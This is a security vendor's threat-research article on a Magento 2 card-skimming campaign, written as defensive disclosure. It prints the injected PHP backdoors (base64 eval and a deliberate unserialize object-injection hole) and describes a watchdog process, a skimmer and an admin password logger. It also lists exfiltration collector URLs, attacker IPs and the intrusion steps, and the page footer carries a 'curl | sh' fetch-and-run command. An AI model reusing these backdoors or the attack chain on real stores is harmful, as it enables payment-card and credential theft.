<!doctype html><html lang="en" class="scroll-pt-20 scroll-smooth"><head><meta charset="UTF-8"><meta name="description" content="Over the last months, hackers have quietly added a subtle security flaw to over 50 large online stores, only to exploit them right before Black Friday, Sanse..."><meta name="generator" content="Eleventy v2.0.1"><meta property="og:url" content="https://sansec.io/research/magento-2-persistent-parasite"><meta property="og:type" content="website"><meta property="og:title" content="Hackers exploit security flaw right before Black Friday"><meta property="og:site_name" content="Sansec"><meta property="og:description" content="Over the last months, hackers have quietly added a subtle security flaw to over 50 large online stores, only to exploit them right before Black Friday, Sanse..."><meta property="og:image" content="https://sansec.io/assets/posts/cache/d7293aa90321cbc79372099af95bbf4c.png"><meta property="og:image:width" content="720"><meta property="og:image:height" content="300"><meta property="twitter:site" content="@sansecio"><meta property="twitter:card" content="summary_large_image"><meta name="ahrefs-site-verification" content="a57b51e4071e265c21eb609be1508e1000b564d78182e5a9a42a836388453b7d"><script type="application/ld+json">{
	  "@context": "https://schema.org",
	  "@type": "WebSite",
	  "name": "Sansec",
	  "alternateName": "Sansec",
	  "url": "https://sansec.io"
	}</script><script type="application/ld+json">{
	  "@context": "https://schema.org",
	  "@type": "Organization",
	  "name": "Sansec",
	  "url": "https://sansec.io",
	  "logo": "https://sansec.io/assets/images/sansec-social.png",
	  "alternateName": "Sansec",
	  "sameAs": [
	    "https://twitter.com/sansecio",
	    "https://sansec.io",
		"https://www.linkedin.com/company/sansec/",
		"https://github.com/sansecio"
	  ],
	  "description": "Over the last months, hackers have quietly added a subtle security flaw to over 50 large online stores, only to exploit them right before Black Friday, Sanse..."
	}</script><meta name="viewport" content="width=device-width"><link rel="icon" href="/assets/images/favicon.ico" type="image/x-icon"><title>Hackers exploit security flaw right before Black Friday</title><link rel="canonical" href="https://sansec.io/research/magento-2-persistent-parasite"><link type="text/plain" rel="author" href="/humans.txt"><link rel="alternate" type="application/atom+xml" title="" href="/atom.xml"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="stylesheet" href="/assets/2023/tailwind.css?1606867200"><script defer="defer" src="/assets/2023/alpine.js"></script><script type="module">//	copy handler for curl ecomscan
        document.addEventListener("DOMContentLoaded", function () {
            document.querySelectorAll(".copyButton").forEach(function (t) {
                t.addEventListener("click", (ev) => {
                    const u = t.getAttribute("data-content");
                    console.log("adding copy handler for", u);
                    navigator.clipboard.writeText(u).then(() => {
                        t.src = "/assets/2023/check.svg";
                        t.classList.remove("animate-pulse");
                        setTimeout(() => {
                            t.src = "/assets/2023/copyfile.svg";
                            t.classList.add("animate-pulse");
                        }, 1000);
                    });

                })
            })
        });
        // menu dropdown
        const c = document.getElementById("dropdown-button"),
            m = document.getElementById("dropdown-button-mob"),
            s = document.getElementById("dropdown-content"),
            d = document.getElementById("dropdown-content-mob"),
            i = document.getElementById("mainmenu-mob"),
            l = document.getElementById("hamburger"),
            a = document.getElementById("mobilemenu"),
            r = document.getElementById("crossMenu"),
            n = document.getElementById("backMenu");
        l.addEventListener("click", function () { a.classList.remove("hidden") });
        r.addEventListener("click", function () { a.classList.add("hidden"), d.classList.add("hidden"), n.classList.add("hidden") });
        n.addEventListener("click", function () { d.classList.add("hidden"), crossMenu.classList.remove("hidden"), n.classList.add("hidden"), i.classList.remove("hidden") });
        c.addEventListener("mouseover", function () { s.classList.remove("hidden") });
        m.addEventListener("click", function () { d.classList.remove("hidden"), n.classList.remove("hidden"), crossMenu.classList.add("hidden"), i.classList.add("hidden") });
        c.addEventListener("mouseleave", function () { s.classList.add("hidden") });</script><script type="text/javascript">window._mfq=window._mfq||[],function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//cdn.mouseflow.com/projects/b8b33745-29ba-4a8d-8a21-4019ba29e934.js",document.getElementsByTagName("head")[0].appendChild(e)}()</script></head><body x-data="{
        ssScrolled: false,
        checkScroll() {
            if (window.pageYOffset > 112) {
                this.ssScrolled = true;
            } else if (window.pageYOffset <= 112) {
                this.ssScrolled = false;
            }
        }
    }" x-init="checkScroll()" @scroll.window="checkScroll()" class="bg-white overscroll-none"><div class="hidden md:block duration-100 bg-white fixed h-28 justify-between shadow-xl top-0 transition-all w-full z-40" :class="{'h-28': !ssScrolled, 'h-16': ssScrolled}"><a href="/guides/usage" class="hidden text-white absolute bg-ss-teal font-poppins font-semibold h-full hover:bg-ss-teal-hover items-center justify-center lg:flex right-0 w-64 z-50"><div class="hidden" :class="{'hidden': !ssScrolled, 'block': ssScrolled}">Scan your store now</div><div class="border-b-2 border-white pb-1" :class="{'block': !ssScrolled, 'hidden': ssScrolled}">Scan your<br>store now</div></a><div class="flex items-center w-full font-poppins font-semibold container flex-row h-full lg:text-base mx-auto relative text-sm"><div class="flex duration-100 flex-initial lg:mr-8 md:mr-4 origin-left transform transition w-[200px]" :class="{'scale-100': !ssScrolled, 'scale-75': ssScrolled}"><a href="/" aria-label="Back to home"><img src="/assets/2023/sansec-black.svg" width="186" height="35" alt="Sansec"></a></div><nav id="nav"><ul class="flex" :class="{'mt-0': ssScrolled, 'mt-2': !ssScrolled}"><li class="cursor-pointer hover:text-ss-teal mr-12"><a href="/#ecomscan">Product</a></li><li class="cursor-pointer hover:text-ss-teal mr-12"><a href="/pricing">Pricing</a></li><li id="dropdown-button" class="cursor-pointer mr-8"><span class="hover:text-ss-teal">Resources</span><svg class="inline-block ml-2 -rotate-90" id="a" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" width="10.666" height="14" viewBox="0 0 10.666 18.504"><path d="m9.959.707L1.414,9.252l8.545,8.545" fill="none" stroke="#1d2227" stroke-width="2"></path></svg><div id="dropdown-content" class="hidden absolute duration-100 transition-all w-48" :class="{'pt-11': !ssScrolled, 'pt-6': ssScrolled}"><div class="bg-white -mt-2 border-ss-teal border-t-4"><ul class="flex flex-col gap-y-8 p-8 shadow-2xl"><a href="/research"><li class="cursor-pointer hover:text-ss-teal">Research</li></a><a href="/partners"><li class="cursor-pointer hover:text-ss-teal">Partners</li></a><a href="/guides"><li class="cursor-pointer hover:text-ss-teal">Guides</li></a><a href="/malware"><li class="cursor-pointer hover:text-ss-teal">Malware</li></a></ul></div></div></li><li class="cursor-pointer hover:text-ss-teal mr-12"><a href="/company">Company</a></li><li class="cursor-pointer hover:text-ss-teal"><a href="/contact">Contact</a></li></ul></nav></div></div><div class="flex items-center w-full bg-white top-0 z-50 fixed h-20 justify-between md:hidden pl-4 pr-4 shadow-xl"><div class="flex mr-16 w-40"><a href="/"><img alt="Sansec logo" src="/assets/2023/sansec-black.svg" width="186" height="35"></a></div><div id="hamburger" class="cursor-pointer flex h-6 w-6"><svg class="" viewBox="0 0 24 18" xmlns="http://www.w3.org/2000/svg"><g stroke="#1d2227" stroke-width="2"><path d="m0 1h24"></path><path d="m0 9h24"></path><path d="m0 17h24"></path></g></svg></div></div><div id="mobilemenu" class="flex items-center w-full bg-white top-0 z-50 fixed bottom-0 flex-col font-poppins font-semibold hidden justify-center text-2xl text-center"><div class="flex items-center w-full bg-white top-0 z-50 h-20 justify-between md:hidden pl-4 pr-4 absolute"><div class="flex mr-16 w-[160px]"><img alt="Sansec logo" src="/assets/2023/sansec-black.svg" width="186" height="35"></div><div id="cross" class="cursor-pointer flex"><svg id="crossMenu" class="h-6 w-6" xmlns="http://www.w3.org/2000/svg" height="18.385" viewBox="0 0 18.385 18.385" width="18.385"><g fill="none" stroke="#1d2227" stroke-width="2"><path d="m286.771 118.832h24" transform="matrix(.70710678 .70710678 -.70710678 .70710678 -118.043 -286.098)"></path><path d="m286.771 118.832h24" transform="matrix(.70710678 -.70710678 .70710678 .70710678 -286.097 136.428)"></path></g></svg><svg id="backMenu" class="hidden -rotate-270 inline-block ml-4" id="a" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" width="14" height="20" viewBox="0 0 10.666 18.504"><path d="m9.959.707L1.414,9.252l8.545,8.545" fill="none" stroke="#1d2227" stroke-width="2"></path></svg></div></div><nav id="nav"><ul id="mainmenu-mob" class="flex flex-col"><li class="cursor-pointer mb-4 hover:text-ss-teal"><a href="/#ecomscan">Product</a></li><li class="cursor-pointer mb-4 hover:text-ss-teal"><a href="/pricing">Pricing</a></li><li id="dropdown-button-mob" class="cursor-pointer mb-4"><span class="hover:text-ss-teal">Resources</span><svg class="inline-block -rotate-90 ml-4" id="a" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" width="10.666" height="14" viewBox="0 0 10.666 18.504"><path d="m9.959.707L1.414,9.252l8.545,8.545" fill="none" stroke="#1d2227" stroke-width="2"></path></svg></li><li class="cursor-pointer mb-4 hover:text-ss-teal"><a href="/company">Company</a></li><li class="cursor-pointer hover:text-ss-teal"><a href="/contact">Contact</a></li></ul><ul id="dropdown-content-mob" class="flex flex-col hidden"><li class="cursor-pointer mb-4 hover:text-ss-teal"><a href="/research">Research</a></li><li class="cursor-pointer mb-4 hover:text-ss-teal"><a href="/partners">Partners</a></li><li class="cursor-pointer hover:text-ss-teal"><a href="/guides">Support</a></li></ul></nav><div class="cursor-pointer flex absolute bg-ss-red bottom-0 flex-none font-bold font-poppins hover:bg-ss-teal items-center justify-center lg:text-base pb-8 pl-8 pr-8 pt-8 text-sm text-white transition-all w-full"><a href="/guides/usage" class="block border-b-2 border-white group-hover:hidden pb-1">Scan your store now!</a></div></div><main class="md:mt-28 mt-20"><div class="bg-ss-grey"><div class="container mx-auto pt-16"><div class="max-w-2xl pb-36"><h1 class="font-bold text-ss-purple leading-tight mb-5 text-4xl">Hackers exploit security flaw right before Black Friday</h1><div class="flex items-center mb-8"><img src="/assets/images/sansec-social.svg" alt="Sansec" class="inline-block h-10 mr-3 w-10" width="610" height="458"><div class="leading-relaxed text-gray-600 font-medium text-sm tracking-tight"><p>by Sansec Forensics Team</p><p class="text-xs">Published in <a href="/research" class="underline">Threat Research</a> &minus; December 02, 2020</p></div></div><div class="leading-relaxed text-gray-600 [&_a]:text-ss-teal hover:[&_a]:text-ss-teal-hover text-xl"><p>Over the last months, hackers have quietly added a subtle security flaw to over 50 large online stores, only to exploit them right before Black Friday, Sansec research shows. The flaw's presence would ensure future access for the attackers, even if their primary operation was blown. Sansec has been tracking this developing campaign since April this year, and found numerous stealthy tactics to dodge detection.</p></div></div></div></div><section class="bg-white mb-12 my-4"><div class="flex gap-x-6 container mx-auto"><div class="max-w-2xl lg:mx-0 w-full"><div class="-mt-32 -mx-6 italic mb-6 text-center text-gray-400 text-sm"><img class="bg-white border border-gray-300" src="/assets/posts/cache/d7293aa90321cbc79372099af95bbf4c.png" alt="Persistent parasite stays dormant in Magento 2 until Black Friday"><p class="mt-1">Persistent parasite stays dormant in Magento 2 until Black Friday</p></div><div class="markdown pt-4"><p><strong>The affected stores were all running the older Magento 2.2, which is unsupported since December 2019.</strong></p><p>In addition to the injected flaw, attackers used a hybrid skimming architecture, with front and back end malware working in tandem. The added obfuscation &amp; safeguarding measures make this the most complex skimming operation Sansec has identified this year.</p><p>Thanks to <a href="https://twitter.com/RicTempesta">@RicTempesta</a>, <a href="https://github.com/giacmir">@giacmir</a> and <a href="https://twitter.com/vdloo_">@vdloo_</a> for additional analysis.</p><h2 id="a-persistent-parasite" tabindex="-1">A persistent parasite</h2><p>Ever bitten by a tick? Just removing the body will not prevent a nasty infection. As is the case with this campaign, where attackers injected multiple safeguarding mechanisms to secure their operations. The attack is extremely difficult to get rid of, and most compromised merchants will see a reinfection within days after a cleanup.</p><p>This sophisticated attack consists of 4 components:</p><ol><li>a subtle POI security flaw functioning as backdoor</li><li>a backdoor watchdog in the form of a hidden system process</li><li>a CORS-defeating hybrid payment (<a href="/what-is-magecart">Magecart</a>) skimmer, using frontend and backend components, with an discrete PII-retrieval feature</li><li>an admin password logger with remote exfiltration</li></ol><p>The backdoor allows the attacker to inject future, more advanced code into the site. The watchdog ensures recovery of the backdoor, should somebody remove it. And the admin password logger, well, logs passwords just in case.</p><p>We will describe each component here. Sansec has found all attacks to be hand-crafted for individual stores, so the malware on your store may vary slightly.</p><p><strong>Are you affected? <a href="/ecomscan">Our eComscan scanner detects all of the varieties that we have investigated so far.</a></strong></p><h2 id="part-a%3A-the-product-compare-backdoor" tabindex="-1">Part A: The Product Compare Backdoor</h2><p>Sansec found two distinct backdoors added to the Product Compare functionality of Magento 2. Both are activated by sending a specially crafted <code>POST</code> to <code>/catalog/product_compare/</code>. The first one is trivial and easily detectable. If the product key matches, it will run the given products as <em>executable code</em>:</p><pre><code class="hljs"><span class="hljs-comment">// generated/code/Magento/Catalog/Controller/Product/Compare/Index/Interceptor.php</span>
<span class="hljs-variable">$productContents</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRequest</span>()-&gt;<span class="hljs-title function_ invoke__">getParam</span>(<span class="hljs-string">&#x27;product_contents&#x27;</span>);
<span class="hljs-variable">$productKey</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRequest</span>()-&gt;<span class="hljs-title function_ invoke__">getParam</span>(<span class="hljs-string">&#x27;product_key&#x27;</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$productContents</span> != <span class="hljs-string">&quot;&quot;</span> &amp;&amp;
    <span class="hljs-variable">$productKey</span> == <span class="hljs-string">&quot;ceedf557f7e6acb1f0025c07df235c555e2d9d808e7f6e6e64825a3d5bb2ee6d&quot;</span>) {
        <span class="hljs-variable">$productValues</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$productContents</span>);
        <span class="hljs-keyword">eval</span> (<span class="hljs-variable">$productValues</span>);
}
</code></pre><p>The second one is much more subtle, because it injects the PHP <code>unserialize</code> function. This feature is officially deprecated, because it allows PHP Object Injection (POI) attacks. Previously, Sansec published <a href="/research/magecart-extension-0days">dozens of POI attacks</a> in eCommerce extensions. The use of unserialize may look benign to the casual observer, while it actually hands full control to anyone knocking on its door (with a properly crafted PHP object).</p><p>Also, the irony of a PHP Object Injection injection is not lost on us.</p><pre><code class="hljs"><span class="hljs-comment">// generated/code/Magento/Catalog/Controller/Product/Compare/Index/Interceptor.php</span>
<span class="hljs-variable">$productContents</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRequest</span>()-&gt;<span class="hljs-title function_ invoke__">getParam</span>(<span class="hljs-string">&#x27;product_contents&#x27;</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$productContents</span> != <span class="hljs-string">&quot;&quot;</span>) {
    <span class="hljs-variable">$pluginData</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Zend\Serializer\Adapter\PhpCode</span>;
    <span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;&quot;plugInfo&quot;;&#x27;</span> . <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$productContents</span>);
    <span class="hljs-variable">$pluginData</span>-&gt;<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);
}
</code></pre><p>NB when this backdoor is used, it will trigger a warning in your logs (<a href="https://docs.zendframework.com/zend-serializer/adapter/">more info</a>):</p><pre><code class="hljs">Warning: Uses eval() The PhpCode adapter utilizes eval() to unserialize. This introduces both a performance and potential security issue as a new process will be executed.

The Zend\Serializer\Adapter\PhpCode adapter generates a parsable PHP code representation using var_export(). To restore, the data will be executed using eval.
</code></pre><p>A similar but slightly different backdoor was found to be injected into <code>app/autoload.php</code>:</p><pre><code class="hljs"><span class="hljs-variable">$productKey</span> = <span class="hljs-string">&quot;&quot;</span>;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;product_key&#x27;</span>]))
    <span class="hljs-variable">$productKey</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;product_key&#x27;</span>];
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;VENDOR_NEW_PATH_MAGE&#x27;</span>]) &amp;&amp;
    (<span class="hljs-variable">$productKey</span> != <span class="hljs-string">&quot;PRODUCT_KEY&quot;</span>) )  {
    <span class="hljs-variable">$vendor_path</span>  = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;VENDOR_NEW_PATH_MAGE&#x27;</span>] ;
    <span class="hljs-variable">$pr_func</span>  = <span class="hljs-string">&quot;base&quot;</span>. <span class="hljs-string">&quot;64_de&quot;</span>.<span class="hljs-string">&quot;code&quot;</span>;
    <span class="hljs-variable">$path_data</span> = <span class="hljs-variable">$pr_func</span>(<span class="hljs-variable">$vendor_path</span>);
        <span class="hljs-keyword">eval</span> (<span class="hljs-variable">$path_data</span>);
}
</code></pre><h2 id="part-b%3A-the-backdoor-watchdog" tabindex="-1">Part B: The Backdoor Watchdog</h2><p>Attackers may have started one or more background processes on your server that will monitor the presence of the malware. Should the backdoor in Product Compare be removed, the original backdoor will get reinstalled. Meanwhile, the timestamps of all your files are reset, so that the odd timestamp will not cause any suspicion.</p><p>The backdoor watchdog is a compiled C process that is started from <code>/pub/media</code>. The process may have multiple names that mimick legitimate system processes, such as:</p><pre><code class="hljs">dnsadmin dormant
sshd [net]
php-fpm: pool www
</code></pre><p>The actual executable is deleted from <code>/pub/media</code> but can be inspected via <code>/proc/&lt;pid&gt;/exe</code>. The watchdog contains a hard copy of the actual backdoor (which can be inspected with <code>strings /proc/&lt;pid&gt;/exe</code>). After reinjecting the backdoor, the watchdog will run <code>find generated/ -type f -name &quot;*.php&quot; -exec touch {}</code> to reset the timestamps.</p><p></p><div class="markdown-img"><img src="/assets/posts/cache/e9ac06876d2ab3243e3e3781dc5d6c66.png" alt=""></div><p></p><p>Additionally, the watchdog process listens on TCP port 9000. We haven't investigated further, but it is likely another out-of-bounds channel to receive commands by the malware owner.</p><p>Pro tip: quickly find any of these backdoor watchdogs by running:</p><pre><code class="hljs">sudo grep -l Magento.Catalog /proc/*/exe
</code></pre><h2 id="part-c%3A-the-magecart-payment-stealer" tabindex="-1">Part C: The Magecart Payment Stealer</h2><p>The skimmer is added to <code>require.js</code> or another static JS file on disk. It may show a fake payment form (customized for the specific shop) but in all cases, sends all of the intercepted data to <code>/checkout</code>. This is almost identical to a normal transaction flow, so security monitoring systems will not raise any flags.</p><p></p><div class="markdown-img"><img src="/assets/posts/cache/2c83c2b5c65fa0c0851ba917275dc976.png" alt=""></div><p></p><p>Then on the server side, a payload handler is added to <code>vendor/magento/module-customer/Model/Session.php</code>. It collects the payment data and saves it to a discrete location for later retrieval (such as <code>pub/media/tmp/design/file/default_luma_logo.jpg</code> or <code>pub/media/tmp/.gitignore</code>):</p><p></p><div class="markdown-img"><img src="/assets/posts/cache/2111ac3723c451d7601ab1e9a3ea5329.png" alt=""></div><p></p><p>The stored credit card data is not retrieved directly, but via a generic POST (in most cases to <code>/</code>). Here, the attacker first retrieves the stolen data (5628 bytes) and then truncates the temporary data storage.</p><pre><code class="hljs">193.160.32.219 -  &quot;POST / HTTP/1.0&quot; 200 5628 &quot;&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36&quot;
193.160.32.219 -  &quot;POST / HTTP/1.1&quot; 200 5611 &quot;&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36&quot;
193.160.32.219 -  &quot;POST / HTTP/1.0&quot; 200 20 &quot;&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36&quot;
193.160.32.219 -  &quot;POST / HTTP/1.1&quot; 200 25 &quot;&quot; &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36&quot;
</code></pre><h2 id="part-d%3A-the-admin-password-logger" tabindex="-1">Part D: The Admin Password Logger</h2><p>While all these lines of defense look fairly impenetrable, the attackers added yet another safeguard. Should all of their access get revoked, they would still receive live copies of staff password, delivered to one of these collector URLs:</p><pre><code class="hljs">https://www.wheelsonheels.co.uk/pub/health_check.php
https://www.ledpro.com/pub/health_check.php
https://zago-store.vn/pub/health_check.php
</code></pre><p>Relevant code:</p><p></p><div class="markdown-img"><img src="/assets/posts/cache/354e170d3a6553ec61a3ecb8285dc3ed.png" alt="Magento 2 password logger"></div><p></p><p>Because the password logger is initially added to <code>vendor/magento/module-backend/Model/Auth.php</code>, it will automatically end up in <code>generated/code/Magento/Backend/Model/Auth/Proxy.php</code> every time the Magento 2 code is regenerated.</p><p>Another interesting bit is the presence of a <code>getCredentialStorageChiper</code> function. It would have looked like a benign function, if only the author hadn't made the mistake of writing <code>Chiper</code> instead of <code>Cipher</code>.</p><p>Luke reported <a href="https://twitter.com/rootprivilege/status/1331766420317773826">one of these password loggers</a> on Twitter last week.</p><h2 id="root-cause-analysis" tabindex="-1">Root cause analysis</h2><p>All investigated targets were running Magento 2.2.3 up to 2.2.7. While it is widely used, the 2.2 branch is officially deprecated and all stores are urged to upgrade to Magento 2.3 or 2.4.</p><p>In order to gain access to these stores in the first place, the attackers exploited multiple security issues that were <a href="https://magento.com/security/patches/magento-2.3.1-2.2.8-and-2.1.17-security-update">patched in Magento version 2.1.17, 2.2.8 and 2.3.1</a>.</p><ol><li>Retrieve hidden admin panel URL via information disclosure issue.</li><li>Intercept logged-in administrator session key via SQL injection.</li><li>Log in on the admin panel and create temporary email template, which can be exploited to run uploaded PHP code.</li><li>Add backdoor</li><li>....possibly a long idle period</li><li>Add skimmer</li><li>Periodically retrieve intercepted payment data via POST to <code>/</code></li></ol><p>An observed attack chain:</p><p></p><div class="markdown-img"><img src="/assets/posts/cache/604cbaf1a5b3fbfc1a4001d7a605b398.png" alt="Magento 2 attack chain"></div><p></p><h2 id="attribution" tabindex="-1">Attribution</h2><p>Sansec observed the following IPs that either injected malware or retrieved intercepted data:</p><pre><code class="hljs">104.129.16.8
104.168.14.206
107.172.97.122
155.94.198.5
167.88.61.117
167.88.61.176
167.88.61.176
185.152.67.39
185.154.13.210
193.160.32.219
198.255.66.27
2.58.45.2
50.7.159.34
66.154.104.2
66.154.105.2
66.212.20.8
67.88.61.176
87.166.53.100
96.44.161.8
</code></pre><h2 id="recommendations" tabindex="-1">Recommendations</h2><p>Sansec recommends all affected merchants to engage a forensic investigate and cleanup. We have provided <a href="/guides/an-issue-was-found-what-next">a checklist</a> for your convenience. Our flagship software <a href="/ecomscan">eComscan</a> will help your team right now with the investigation, and will also help to prevent future incidents.</p><p><em>Header image by <a href="https://unsplash.com/@erik_karits">Erik Karits</a></em></p><h2>Read more</h2><ul><li><a href="/research/cosmicsting-fallout">Thousands of Adobe Commerce stores hacked in competing CosmicSting campaigns</a></li><li><a href="/research/cosmicsting">CosmicSting attack & defense overview</a></li><li><a href="/research/cosmicsting-cnext-persistent-backdoor">Persistent backdoors injected on Adobe Commerce via new CosmicSting attack</a></li><li><a href="/research/cosmicsting-hitting-major-stores">CosmicSting attacks have started hitting major stores</a></li><li><a href="/research/polyfill-supply-chain-attack">Polyfill supply chain attack hits 100K+ sites</a></li></ul></div></div><div class="hidden lg:block lg:flex-1 overflow-clip pt-4"><div data-aos="fade-left" class="flex flex-col gap-y-8 [&>div]:border-ss-grey [&>div]:border-t-2 [&>div]:p-4 [&>div]:shadow-md max-w-[350px] my-0 overflow-clip pb-4 px-8 sticky text-sm top-24"><div class=""><h5 class="font-bold text-ss-purple mb-3 overflow-clip overflow-ellipsis">In this article</h5><nav class="toc"><ol><li><a href="#a-persistent-parasite">A persistent parasite</a></li><li><a href="#part-a%3A-the-product-compare-backdoor">Part A: The Product Compare Backdoor</a></li><li><a href="#part-b%3A-the-backdoor-watchdog">Part B: The Backdoor Watchdog</a></li><li><a href="#part-c%3A-the-magecart-payment-stealer">Part C: The Magecart Payment Stealer</a></li><li><a href="#part-d%3A-the-admin-password-logger">Part D: The Admin Password Logger</a></li><li><a href="#root-cause-analysis">Root cause analysis</a></li><li><a href="#attribution">Attribution</a></li><li><a href="#recommendations">Recommendations</a></li></ol></nav></div><div class="overflow-hidden relative"><img src="/assets/2023/malware.svg" class="-right-12 -top-12 absolute h-40 opacity-5"><h5 class="font-bold text-ss-purple mb-3">Easy CSP for your store?</h5><p class="leading-relaxed text-gray-700">Try Sansec Watch! Free, simple and fully integrated. Get PCI compliant alerting with minimal effort.</p><a class="block font-semibold bg-ss-teal hover:bg-ss-teal-hover mb-1 mt-3 py-1 rounded text-center text-white whitespace-nowrap" href="/watch">Sansec Watch</a></div></div></div></div></section><div class="text-white bg-ss-purple container mx-auto p-0 sm:rounded-t-md"><div class="grid md:grid-cols-12 overflow-hidden"><div class="lg:p-16 md:col-span-7 px-4 py-8 sm:p-10"><h2 class="leading-tight font-semibold text-3xl tracking-wide">Scan your store <span class="text-ss-yellow">now</span><br>for malware &amp; vulnerabilities</h2><div class="flex items-center w-full justify-between bg-ss-deep-purple font-roboto-mono my-10 p-4 rounded-lg text-lg tracking-wider">$ curl ecomscan.com | sh<div class="flex h-full relative"><img class="cursor-pointer h-6 w-6 animate-pulse bg-ss-dark copyButton duration-100 ease-in-out hidden hover:animate-none hover:scale-105 md:block" data-content="curl https://ecomscan.com | sh" alt="copy code" src="/assets/2023/copyfile.svg" width="40" height="50"></div></div><p><a href="/#ecomscan" class="text-ss-yellow sm:no-underline underline">eComscan</a> is the most thorough security scanner for Magento, Adobe Commerce, Shopware, WooCommerce and many more.</p><a href="/#ecomscan" class="hidden font-bold bg-ss-yellow hover:bg-white max-w-fit mt-10 p-3 rounded sm:block text-sm text-ss-purple tracking-wider uppercase">Learn more</a></div><div class="hidden items-end h-full md:col-span-5 relative sm:flex"><div class="w-[900px] -bottom-16 absolute bg-ss-dark h-full rounded-xl"><div class="p-4 pl-6"><img class="w-[100px]" alt="Terminal window" src="/assets/2023/trafficlight.svg" width="118" height="26"></div><img class="w-[900px]" alt="eComscan demo" src="/assets/2023/ecomdemo.webp" width="1200" height="700"></div></div></div></div></main><div class="overflow-clip bg-black relative z-30"><div class="hidden md:block absolute bg-ss-yellow h-52 right-0 rounded-full translate-x-40 translate-y-20 w-52"></div><div class="container mx-auto pt-16 gap-8 grid md:grid-cols-9"><div class="hidden md:block col-span-2 text-white space-y-10"><h3 class="font-bold text-lg">Made with <span class="text-ss-teal">â¤</span></h3><div class="font-inter text-sm">Sansec BV<br>Wolvenplein 25<br>3512 CK Utrecht<br>The Netherlands<br><a class="text-ss-teal hover:underline" href="/cdn-cgi/l/email-protection#8be2e5ede4cbf8eae5f8eee8a5e2e4"><span class="__cf_email__" data-cfemail="325b5c545d7241535c4157511c5b5d">[email&#160;protected]</span></a></div><img src="/assets/images/pango-icon-100.webp" width="100" height="100" alt="Sansec mascotte Pango" class="ml-2 mt-4 h-24"></div><div class="hidden md:block col-span-2 text-white"><a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/ecomscan">Product</a><a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/pricing">Pricing</a><a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/guides">Guides</a><a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/partners">Partners</a> <a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/what-is-magecart">About Magecart</a> <a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/malware">Malware library</a> <a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/media-coverage">Media coverage</a> <a class="cursor-pointer mb-4 block font-semibold hover:underline" href="https://status.sansec.io">System status</a></div><div class="hidden md:block col-span-2 text-white"><a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/research">Research</a><a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/company">Company</a><a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/contact">Contact</a> <a class="cursor-pointer mb-4 block font-semibold hover:underline" href="https://t.me/+UIHBVcHK4OYxYjlk">Telegram</a> <a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/account">Login</a></div><div class="text-white text-center col-span-3 md:text-left z-40"><h2 class="font-bold text-2xl">Stay up to date with the latest eCommerce attacks</h2><newsletter data-classes="newsletter_footer"></newsletter></div></div><div class="flex items-center container mx-auto relative border-opacity-50 border-ss-grey flex-col md:flex-row md:items-end md:justify-between mt-24 pb-8"><div><img class="mb-12 md:mb-0" alt="Sansec logo" src="/assets/2023/sansec-white.svg" width="215" height="40"></div><div><h2 class="text-white text-center font-bold text-3xl">experts in eCommerce security</h2></div></div><div class="flex flex-col container md:flex-row mx-auto pb-8 justify-between"><div class="flex mb-8 gap-x-8 items-end justify-center md:justify-start md:mb-0 text-white"><a href="https://bsky.app/profile/sans.ec" aria-label="Our Bluesky account (@sans.ec)" class="block"><img class="h-6 translate-y-0.5" alt="Bluesky" src="/assets/2023/bluesky.svg"> </a><a href="https://www.linkedin.com/company/sansec/" aria-label="Linkedin" class="block"><img class="h-6" src="/assets/2023/linkedin.svg" alt="Linkedin"> </a><a href="/cdn-cgi/l/email-protection#f1989f979eb182909f829492df989e" aria-label="Send us a mail" class="block"><img class="h-5" src="/assets/2023/mail.svg" alt="Email"> </a><a href="/atom.xml" aria-label="Subscribe to our RSS feed" class="block"><img class="h-5" src="/assets/images/rss.svg" alt="RSS"></a></div><div><h2 class="text-white text-center font-inter md:text-sm text-xs"><a class="cursor-pointer hover:underline" href="/downloads/sansec_tc.pdf">Terms & Conditions</a><div class="inline-block ml-2 mr-2">|</div><a class="cursor-pointer hover:underline" href="/downloads/sansec_pcp.pdf">Privacy & 